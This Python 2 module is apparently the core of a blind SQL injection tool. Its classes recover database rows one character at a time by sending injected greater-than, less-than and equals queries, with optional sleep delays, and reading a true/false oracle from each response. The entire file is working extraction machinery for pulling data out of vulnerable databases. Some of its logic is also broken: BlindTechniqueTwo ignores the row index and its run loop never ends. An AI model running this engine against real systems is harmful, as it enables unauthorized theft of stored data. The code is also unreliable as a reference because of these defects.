#file: technique.py

from . import debug
from .truth import Truth
from .settings import *
from .exceptions import *

from gevent.pool import Pool
from copy import copy

class Technique(object):
    '''
    This is a sql injection teqnique. Eg. Union based or Time based... Techniques need
    to implement at minimum the run method which is what actually launches the technique.
    Techniques will usually also take a user_query (query we are trying to run on the db).
    The class init init will (almost?) always take a make_request_func as a param. This
    option specifies the function to call to make an actual request. 
    '''
    @debug.func
    def __init__(self,make_request_func,query,concurrency=1): 
        self.query = query
        self.make_request_func = make_request_func
        self.pool = Pool(size=concurrency)
        self.concurrency = concurrency

        if type(self) == Technique:
            raise NotImplemented

    def run(self):
        '''
        run the exploit
        '''
        raise NotImplemented("technique.run")


class BlindTechnique(Technique):
    def __init__(self,truth = Truth(), *args, **kwargs):
        self.truth = truth
        super(BlindTechnique,self).__init__(*args,**kwargs)

    @debug.func
    def run(self,user_query,sleep=None):
        self.sleep = sleep

        user_query = user_query
    
        results = []
        row_index = 0
        row = True
        #we get more rows until the table is over
        while row:            
            #if this isnt the first iteration
            if row != True:
                results.append(row)
            row = self._get_next_row(row_index,user_query)
            row_index += 1
        return results

    @debug.func
    def _get_next_row(self,row_index,user_query):
        '''finding a row'''
        row = ""
        char_index = 1
        char = True
        #we get more chars until the row is over
        while char:
            #if this isnt the first iteration
            if char != True:
                row += char
            char = self._get_next_char(char_index,row_index,user_query)
            char_index += 1
        if row != "":
            return row
        else:
            return False

    @debug.func
    def _get_next_char(self,char_index,row_index,user_query):
        '''finding a character'''
        low = 0
        high = CHARSET_LEN
        while low < high:
            mid = (low+high)/2
            if self._is_greater(row_index, char_index, CHARSET[mid],user_query):
                high = mid
            elif self._is_less(row_index, char_index, CHARSET[mid],user_query):
                low = mid + 1
            elif low < CHARSET_LEN and self._is_equal(row_index, char_index, CHARSET[mid],user_query):
                return CHARSET[mid]
            else:
                return False
    
    @debug.func
    def _is_greater(self,row_index,char_index,char_val,user_query):
        '''
        Returns true if the specified character in the specified row is greater
        that char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','<')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    @debug.func
    def _is_less(self,row_index,char_index,char_val,user_query):
        '''
        Returns true if the specified character in the specified row is les
        than char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','>')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    @debug.func
    def _is_equal(self,row_index,char_index,char_val,user_query):
        '''
        Returns true if the specified character in the specified row is equal
        that char_value. It is up to you how to implement this...
        '''  
        query = copy(self.query)
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','=')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))


class Character:
    def __init__(self,row_index,char_index,query,user_query,make_request_func,truth,sleep):
        self.row_index = row_index
        self.char_index = char_index
        self.query = query
        self.user_query = user_query
        self.make_request_func = make_request_func
        self.truth = truth
        self.sleep = sleep

        self.char_val = CHARSET[len(CHARSET)//2]

        self.done  = False
        self.error = False

        self.attempt = self.__attempt__().next

    @debug.func
    def __attempt__(self):
        '''keep trying to figure out this character's value. each time this method is called a request will be sent'''
        low = 0
        high = CHARSET_LEN
        while low < high:
            mid = (low+high)/2
            if self._is_greater(CHARSET[mid]):
                high = mid
            elif self._is_less(CHARSET[mid]):
                low = mid + 1
            elif low < CHARSET_LEN and self._is_equal(CHARSET[mid]):
                self.done = True
            else:
                self.error = True
            yield None

    @debug.func
    def _is_greater(self,char_val):
        '''
        Returns true if the specified character in the specified row is greater
        that char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',self.user_query)
        query.set_option('row_index',str(self.row_index))
        query.set_option('char_index',str(self.char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','<')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    @debug.func
    def _is_less(self,char_val):
        '''
        Returns true if the specified character in the specified row is les
        than char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',self.user_query)
        query.set_option('row_index',str(self.row_index))
        query.set_option('char_index',str(self.char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','>')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    @debug.func
    def _is_equal(self,char_val):
        '''
        Returns true if the specified character in the specified row is equal
        that char_value. It is up to you how to implement this...
        '''  
        query = copy(self.query)
        query.set_option('user_query',self.user_query)
        query.set_option('row_index',str(self.row_index))
        query.set_option('char_index',str(self.char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','=')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    def __repr__(self):
        '''return a character if we have finished without errors'''
        return ['',self.char_val][self.done and (not self.error)]

    def __str__(self):
        '''return a character if we have finished without errors'''
        return ['',self.char_val][self.done and (not self.error)]

    def __eq__(self,y):
        '''return faled if we failed, working if we are still working, and a character if we have finished'''
        return y==["failed","working",self.char_val][(not self.error) + ((not self.error) and self.done)]
    
    def __ne__(self,y):
        return not self.__eq__(y)

class BlindTechniqueTwo(Technique):
    def __init__(self,truth = Truth(), *args, **kwargs):
        self.truth = truth
        super(BlindTechniqueTwo,self).__init__(*args,**kwargs)

    def __character_generator__(self,row_index=0,char_index=0):
        while True:
            yield Character(\
                row_index           = row_index,\
                char_index          = char_index,\
                query               = self.query,\
                user_query          = self.user_query,\
                make_request_func   = self.make_request_func,\
                truth               = self.truth,\
                sleep               = self.sleep)
            char_index += 1
    
    def __get_row__(self,row_index):
        row = []
        size = self.concurrency
        chargen = self.__character_generator__()

        while "failed" not in row or "working" in row[:row.index("failed")]:
            chars_needed = (size - row.count("working")) * ("failed" not in row or "working" in row[:row.index("failed")])
            row += [chargen.next() for x in range(chars_needed)]
            [self.pool.spawn(char.attempt) if char == "working" else '' for char in row]
        
        rval = ''.join([str(elt) for elt in row[:row.index("failed")]])
        print rval
        return rval
        

    @debug.func
    def run(self,user_query,sleep=None):
        self.user_query = user_query
        self.sleep = sleep

        row_index = 0
        results = []
        row = True
        while row != "":
            results.append(self.__get_row__(row_index))
            row_index += 1
        
        print results
        return results



